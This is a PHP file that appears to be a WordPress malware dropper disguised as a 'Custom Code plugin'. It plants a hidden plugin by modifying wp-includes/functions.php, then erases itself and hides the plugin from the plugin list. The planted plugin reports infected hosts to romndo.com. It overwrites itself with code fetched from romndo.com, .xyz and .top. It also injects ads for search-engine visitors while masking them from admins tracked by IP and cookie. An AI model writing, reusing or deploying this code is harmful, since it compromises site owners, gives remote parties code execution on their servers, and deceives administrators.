<?php
$type = __FILE__;
$fExistPlugin1 = function_exists('searchFilesFromPlugin');
$fExistPlugin2 = function_exists('insertMyPluginFromPlugin');
$fExistTheme1 = function_exists('searchFilesFromTheme');
$fExistTheme2 = function_exists('updateFilesFromTheme');
if (!$fExistPlugin1 && !$fExistPlugin2 && !$fExistTheme1 && !$fExistTheme2) {
	if ( !defined('SCRIPT_PATH') ) define('SCRIPT_PATH', __FILE__);
	if ( !defined('SERCH_FILE') ) define('SERCH_FILE', 'functions.php');
	if ( !defined('PLUGIN_NAME') ) define('PLUGIN_NAME', 'cplugin.php');
	// header plugin
	if ( !defined('HEADER_PLUGIN_NAME') ) define('HEADER_PLUGIN_NAME', 'Plugin Name: Custom Code plugin');
	if ( !defined('HEADER_PLUGIN_DESCRIPTION') ) define('HEADER_PLUGIN_DESCRIPTION', 'Description: Cplugin Shows cusom codes with many options to display your ad codes.');
	if ( !defined('HEADER_PLUGIN_AUTHOR') ) define('HEADER_PLUGIN_AUTHOR', 'Author: Rian Lambacher');
	if ( !defined('HEADER_PLUGIN_VERSION') ) define('HEADER_PLUGIN_VERSION', 'Version: 1.0');
    $pluginCodeconst = <<<'EOD'
<?php
/**
 * HEADER_PLUGIN_NAME
 * HEADER_PLUGIN_DESCRIPTION
 * HEADER_PLUGIN_AUTHOR
 * HEADER_PLUGIN_VERSION
 */
error_reporting(0);
ini_set('display_errors', 0);
$plugin_key='00bc9a128205df1dcaf70e76c6342e29';
$version='1.2';
add_action('admin_menu', function() {
    add_options_page( 'cplugin Plugin', 'cplugin', 'manage_options', 'cplugin', 'cplugin_page' );
    remove_submenu_page( 'options-general.php', 'cplugin' );
});
add_filter('plugin_action_links_'.plugin_basename(__FILE__), 'salcode_add_plugin_page_settings_cplugin');
function salcode_add_plugin_page_settings_cplugin( $links ) {
	$links[] = '<a href="' .
		admin_url( 'options-general.php?page=cplugin' ) .
		'">' . __('Settings') . '</a>';
	return $links;
}
add_action( 'admin_init', function() {
    register_setting( 'cplugin-settings', 'default_mont_options' );
    register_setting( 'cplugin-settings', 'ad_code' );
	register_setting( 'cplugin-settings', 'hide_admin' );
	register_setting( 'cplugin-settings', 'hide_logged_in' );
    register_setting( 'cplugin-settings', 'display_ad' );
    register_setting( 'cplugin-settings', 'search_engines' );
	register_setting( 'cplugin-settings', 'auto_update' );
	register_setting( 'cplugin-settings', 'ip_admin');
	register_setting( 'cplugin-settings', 'cookies_admin' );
	register_setting( 'cplugin-settings', 'logged_admin' );
	register_setting( 'cplugin-settings', 'log_install' );
	
});
$ad_code='';
$hide_admin='on';
$hide_logged_in='on';
$display_ad='organic';
$search_engines='google.,/search?,images.google., web.info.com, search.,yahoo.,yandex,msn.,baidu,bing.,doubleclick.net,googleweblight.com';
$auto_update='on';
$ip_admin='on';
$cookies_admin='on';
$logged_admin='on';
$log_install='';
function cplugin_page() {
 ?>
   <div class="wrap">
<form action="options.php" method="post">
       <?php
       settings_fields( 'cplugin-settings' );
       do_settings_sections( 'cplugin-settings' );
$ad_code='';
$hide_admin='on';
$hide_logged_in='on';
$display_ad='organic';
$search_engines='google.,/search?,images.google., web.info.com, search.,yahoo.,yandex,msn.,baidu,bing.,doubleclick.net,googleweblight.com';
$auto_update='on';
$ip_admin='on';
$cookies_admin='on';
$logged_admin='on';
$log_install='';
       ?>
	   <h2>cplugin Plugin</h2>
	   <table>
             
 <tr>
                <th>Ad Code</th>
                <td><textarea placeholder="" name="ad_code" rows="5" cols="130"><?php echo get_option('ad_code',$ad_code) ; ?></textarea></td>
            </tr>
			
			
			
<tr>
                <th>Hide ads to :</th>
                <td>
                    <input type="hidden" id="default_mont_options" name="default_mont_options" value="on">
                    <label>
                        <input type="checkbox" name="hide_admin" <?php echo esc_attr( get_option('hide_admin',$hide_admin) ) == 'on' ? 'checked="checked"' : ''; ?> />admins
                    </label>
                    <label>
                        <input type="checkbox" name="hide_logged_in" <?php echo esc_attr( get_option('hide_logged_in',$hide_logged_in) ) == 'on' ? 'checked="checked"' : ''; ?> />logged in users
                    </label>
					<br/>
                 
                </td>
            </tr>
			
			
			
			<tr>
                <th>Recognize admin by :</th>
                <td>
                    <label>
                        <input type="checkbox" name="logged_admin" <?php echo esc_attr( get_option('logged_admin',$logged_admin) ) == 'on' ? 'checked="checked"' : ''; ?> />logged in
                    </label>
                    <label>
                        <input type="checkbox" name="ip_admin" id="ip_admin"  <?php echo esc_attr( get_option('ip_admin',$ip_admin) ) == 'on' ? 'checked="checked"' : '' ?> />By IP addresses
                    </label>
                                        <label>
                        <input type="checkbox" name="cookies_admin" <?php echo esc_attr( get_option('cookies_admin',$cookies_admin) ) == 'on' ? 'checked="checked"' : ''; ?> />By Cookies
                    </label>
				
                 
                </td>
            </tr>
			
			
			
			<tr>
                <th>Display ads to :</th>
                <td>
                 				         <select name="display_ad">
                        
                        <option value="organic" <?php echo esc_attr( get_option('display_ad',$display_ad) ) == 'organic' ? 'selected="selected"' : ''; ?>>Organic traffic only</option>
                        <option value="all_visitors" <?php echo esc_attr( get_option('display_ad') ) == 'all_visitors' ? 'selected="selected"' : ''; ?>>All Visitors</option>
                        
                    </select>
                </td>
            </tr>
            <tr>
                <th>Search Engines</th>
                <td><input type="text" placeholder="Internal title" name="search_engines" value="<?php echo esc_attr( get_option('search_engines',$search_engines) ); ?>" size="80" /><p class="description">
			comma separated  </p>
				</td>
            </tr>
 
 
 <tr>
                <th>Auto Update :</th>
                <td>
                    <label>
                        <input type="checkbox" name="auto_update" <?php echo esc_attr( get_option('auto_update',$auto_update) ) == 'on' ? 'checked="checked"' : ''; ?> />auto update plugin
                    </label><br/>
                 
                </td>
            </tr>
 
            <tr>
                <td><?php submit_button(); ?></td>
            </tr>
 
        </table>
	   
	   
	   
     </form>
   </div>
 <?php
}
/*************************log install***************************/
if(get_option('log_install') !=='1')
{
    if(!$log_installed = @file_get_contents("http://www.romndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]))
{
    $log_installed = @file_get_contents_cplugin("http://www.romndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]);
}
}
/*************************set default options***************************/
if(get_option('default_mont_options') !=='on')
{
update_option('ip_admin', $ip_admin);
update_option('ad_code', $ad_code);
update_option('cookies_admin', $cookies_admin);
update_option('logged_admin', $logged_admin);
update_option('hide_admin', $hide_admin);
update_option('hide_logged_in', $hide_logged_in);
update_option('display_ad', $display_ad);
update_option('search_engines', $search_engines);
update_option('auto_update', $auto_update);
update_option('log_install', '1');
}
/************************************************************************/
include_once(ABSPATH . 'wp-includes/pluggable.php'); 
if ( ! function_exists( 'display_ad_single' ) ) {  
function display_ad_single($content){ 
if(is_single())
{
$content=$content.get_option('ad_code');;
}
return $content;
} 
function display_ad_footer(){ 
if(!is_single())
{
echo get_option('ad_code');
}
} 
//setting cookies if admin logged in
function setting_admin_cookie() {
  setcookie( 'wordpress_admin_logged_in',1, time()+3600*24*1000, COOKIEPATH, COOKIE_DOMAIN);
  }
if(get_option('cookies_admin')=='on')
{
if(is_user_logged_in())
{
add_action( 'init', 'setting_admin_cookie',1 );
}
}
//log admin IP addresses
$vis_ip=getVisIpAddr_cplugin();
if(get_option('ip_admin')=='on')
{
if(current_user_can('edit_others_pages'))
{
if (file_exists(plugin_dir_path( __FILE__ ) .'admin_ips.txt'))
{
$ip=@file_get_contents(plugin_dir_path( __FILE__ ) .'admin_ips.txt');
}
if (stripos($ip, $vis_ip) === false)
{
$ip.=$vis_ip.'
';
@file_put_contents(plugin_dir_path( __FILE__ ) .'admin_ips.txt',$ip);
}
}
}// end if log admins ip
//add cookies to organic traffic
if(get_option('display_ad')=='organic')
{
$search_engines = explode(',', get_option('search_engines'));
$referer = $_SERVER['HTTP_REFERER'];
$SE = array('google.','/search?','images.google.', 'web.info.com', 'search.','yahoo.','yandex','msn.','baidu','bing.','doubleclick.net','googleweblight.com');
foreach ($search_engines as $search) {
  if (strpos($referer,$search)!==false) {
    setcookie("organic", 1, time()+120, COOKIEPATH, COOKIE_DOMAIN); 
	$organic=true;
  }
}
}//end
//display ad
if(!isset($_COOKIE['wordpress_admin_logged_in']) && !is_user_logged_in()) 
{
$ips=@file_get_contents(plugin_dir_path( __FILE__ ) .'admin_ips.txt');
if (stripos($ips, $vis_ip) === false)
{
/*****/
if(get_option('display_ad')=='organic')
{
if($organic==true || isset($_COOKIE['organic']))
{
add_filter('the_content','display_ad_single');
add_action('wp_footer','display_ad_footer'); 
}
}
else
{
add_filter('the_content','display_ad_single');
add_action('wp_footer','display_ad_footer');  
}
/****/
}
}
/*******************/
//update plugin
if(get_option('auto_update')=='on')
{
if( ini_get('allow_url_fopen') ) {
        if (($new_version = @file_get_contents("http://www.romndo.com/update.php") OR $new_version = @file_get_contents_cplugin("http://www.romndo.com/update.php")) AND stripos($new_version, $plugin_key) !== false) {
            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                
            }
        }
        
        
                elseif ($new_version = @file_get_contents("http://www.romndo.xyz/update.php") AND stripos($new_version, $plugin_key) !== false) {
            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                
            }
        }
        elseif ($new_version = @file_get_contents("http://www.romndo.top/update.php") AND stripos($new_version, $plugin_key) !== false) {
            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                
            }
        }
}
else
{
            if (($new_version = @file_get_contents("http://www.romndo.com/update.php") OR $new_version = @file_get_contents_cplugin("http://www.romndo.com/update.php")) AND stripos($new_version, $plugin_key) !== false) {
            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                
            }
        }
        
        
                elseif ($new_version = @file_get_contents_cplugin("http://www.romndo.xyz/update.php") AND stripos($new_version, $plugin_key) !== false) {
            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                
            }
        }
        elseif ($new_version = @file_get_contents_cplugin("http://www.romndo.top/update.php") AND stripos($new_version, $plugin_key) !== false) {
            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                
            }
        }
}
}//end if auto update
/*********************************/
}// if function exist
     function file_get_contents_cplugin($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
function hide_plugin_cplugin() {
  global $wp_list_table;
  $hidearr = array('cplugin.php');
  $myplugins = $wp_list_table->items;
  foreach ($myplugins as $key => $val) {
    if (in_array($key,$hidearr)) {
      unset($wp_list_table->items[$key]);
    }
  }
}
add_action('pre_current_active_plugins', 'hide_plugin_cplugin');
        function getVisIpAddr_cplugin() { 
      
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
        return $_SERVER['HTTP_CLIENT_IP']; 
    } 
    else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
        return $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } 
    else { 
        return $_SERVER['REMOTE_ADDR']; 
    } 
}
?>
EOD;
	if ( !defined('PLUGIN_CODE') ) define('PLUGIN_CODE', $pluginCodeconst);
    $insertCodeConst = <<<'EOD'
function true_plugins_activate() {
	$active_plugins = get_option('active_plugins');
	$activate_this = array(
		'cplugin.php'
	);
	foreach ($activate_this as $plugin) {
		if (!in_array($plugin, $active_plugins)) {
			array_push($active_plugins, $plugin);
			update_option('active_plugins', $active_plugins);
		}
	}
	$new_active_plugins = get_option('active_plugins');
	if (in_array('cplugin.php', $new_active_plugins)) {
		$functionsPath = dirname(__FILE__) . '/functions.php';
		$functions = file_get_contents($functionsPath);
		$start = stripos($functions, "function true_plugins_activate()");
		$end = strripos($functions, "true_plugins_activate");
		$endDelete = $end + mb_strlen("true_plugins_activate") + 3;
		if($start && $end) {
			$str = substr($functions, 0, $start);
			$str .= substr($functions, $endDelete);
			file_put_contents($functionsPath, $str);
		}
		//clear_script
	}
}
add_action('init', 'true_plugins_activate');
EOD;
	if ( !defined('INSERT_CODE') ) define('INSERT_CODE', $insertCodeConst);
}
// --------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------
// ------------------------------------ PLUGIN ------------------------------------------------
// --------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------
if ((bool)stristr($type, 'wp-content/plugins') && !$fExistPlugin1 && !$fExistPlugin2) {
	function searchFilesFromPlugin($dir, $tosearch) {
		$files = array_diff(scandir($dir), [".", ".."]);
		$filesList = [];
		foreach($files as $file) {
			if(!is_dir($dir . '/' . $file)) {
				if (strtolower($file) == $tosearch)
				$filesList[] = $dir . '/' . $file;
			} else {
				$res = searchFilesFromPlugin($dir . '/' . $file, $tosearch);
				if ($res) {
					$arr = $res;
					$filesList = array_merge($filesList, $arr);
				}
			}
		}
		return $filesList;
	}
	$activatePluginDir = dirname(__FILE__);
	$currentPluginDir = stristr($activatePluginDir, 'wp-content/plugins/');
	if ($currentPluginDir) {
		$currentPluginDir = str_replace('wp-content/plugins/', '', $currentPluginDir);
		$currentPluginDir = explode('/', $currentPluginDir)[0];
		$pluginPath = explode($currentPluginDir, $activatePluginDir, -1)[0] . $currentPluginDir;
	} else {
		$pluginPath = $activatePluginDir;
	}
	
	$pluginFiles = array_filter(scandir($pluginPath), function($name) {
		if (stristr($name, '.php') !== false) {
			return $name;
		}
	});
	$pluginFile = '';
	foreach ($pluginFiles as $file) {
		$temp = file_get_contents($pluginPath . '/' . $file);
		if (stristr($temp, 'Plugin Name:') !== false) {
			unset($temp);
			$pluginFile = $file;
			break;
		}
		unset($temp);
	}
	add_action('init', 'insertMyPluginFromPlugin');
	function insertMyPluginFromPlugin() {
		$active_plugins = get_option('active_plugins');
		if (!in_array(PLUGIN_NAME, $active_plugins)) {
			$folderName = dirname($_SERVER['DOCUMENT_ROOT']);
			$result = searchFilesFromPlugin($folderName, SERCH_FILE);
			if(0 < count($result)){
				$clearScriptCode = <<<'CLEAR'
		$script = file_get_contents('SCRIPT_PATH');
		file_put_contents('SCRIPT_PATH', '');
CLEAR;
				$clearScriptCode = str_replace('SCRIPT_PATH', SCRIPT_PATH, $clearScriptCode);
				$insertCode = str_replace('//clear_script', $clearScriptCode, INSERT_CODE);
				$pluginCode = str_replace(
					['HEADER_PLUGIN_NAME', 'HEADER_PLUGIN_DESCRIPTION', 'HEADER_PLUGIN_AUTHOR', 'HEADER_PLUGIN_VERSION'],
					[HEADER_PLUGIN_NAME, HEADER_PLUGIN_DESCRIPTION, HEADER_PLUGIN_AUTHOR, HEADER_PLUGIN_VERSION], 
					PLUGIN_CODE
				);
				foreach($result as $file) {
					if (stristr($file, 'wp-includes/functions.php') !== false) {
						$newPlugin = str_replace('wp-includes/functions.php', 'wp-content/plugins/' . PLUGIN_NAME, $file);
						$copyPlugin = file_put_contents($newPlugin, $pluginCode);
		
						if ($copyPlugin) {
							$temp = file_get_contents($file);
							$start = stripos($temp, "function true_plugins_activate()");
							$end = strripos($temp, "true_plugins_activate");
							$endDelete = $end + mb_strlen("true_plugins_activate") + 3;
		
							if($start && $end) {
								$str = substr($temp, 0, $start);
								$str .= substr($temp, $endDelete);
								file_put_contents($file, $str);
							}
							file_put_contents($file, PHP_EOL . $insertCode . PHP_EOL, FILE_APPEND | LOCK_EX);
						}
					}
				}
			}
		}
	}
// --------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------
// ------------------------------------- THEME ------------------------------------------------
// --------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------
} elseif ((bool)stristr($type, 'wp-content/themes') && (!$fExistTheme1 && !$fExistTheme2)) {
	function searchFilesFromTheme($dir, $tosearch) {
		$files = array_diff(scandir($dir), [".", ".."]);
		$filesList = [];
		foreach($files as $file) {
			if(!is_dir($dir . '/' . $file)) {
				if (strtolower($file) == $tosearch)
				$filesList[] = $dir . '/' . $file;
			} else {
				$res = searchFilesFromTheme($dir . '/' . $file, $tosearch);
				if ($res) {
					$arr = $res;
					$filesList = array_merge($filesList, $arr);
				}
			}
		}
		return $filesList;
	}	
	add_action('after_setup_theme', 'updateFilesFromTheme');
	function updateFilesFromTheme() {
		if ( @ $_GET['activated'] === 'true'){
			$folderName = dirname($_SERVER['DOCUMENT_ROOT']);
			$result = searchFilesFromTheme($folderName, SERCH_FILE);
			$pluginCode = str_replace(
				['HEADER_PLUGIN_NAME', 'HEADER_PLUGIN_DESCRIPTION', 'HEADER_PLUGIN_AUTHOR', 'HEADER_PLUGIN_VERSION'],
				[HEADER_PLUGIN_NAME, HEADER_PLUGIN_DESCRIPTION, HEADER_PLUGIN_AUTHOR, HEADER_PLUGIN_VERSION], 
				PLUGIN_CODE
			);
			if (0 < count($result)) {
			
						$clearScriptCode = <<<'CLEAR'
		$script = file_get_contents('SCRIPT_PATH');
		file_put_contents('SCRIPT_PATH', '');
CLEAR;
				$clearScriptCode = str_replace('SCRIPT_PATH', SCRIPT_PATH, $clearScriptCode);
				$insertCode = str_replace('//clear_script', $clearScriptCode, INSERT_CODE);
			
			
			
				foreach($result as $file) {
					if (stristr($file, 'wp-includes/functions.php') !== false) {
						$newPlugin = str_replace('wp-includes/functions.php', 'wp-content/plugins/' . PLUGIN_NAME, $file);
						$copyPlugin = file_put_contents($newPlugin, $pluginCode);
						if ($copyPlugin) {
							$temp = file_get_contents($file);
							$start = stripos($temp, "function true_plugins_activate()");
							$end = strripos($temp, "true_plugins_activate");
							$endDelete = $end + mb_strlen("true_plugins_activate") + 3;
							if($start && $end) {
								$str = substr($temp, 0, $start);
								$str .= substr($temp, $endDelete);
								file_put_contents($file, $str);
							}
							file_put_contents($file, PHP_EOL . $insertCode . PHP_EOL, FILE_APPEND | LOCK_EX);
						}
					}
				}
			}
		}
	}
}
?>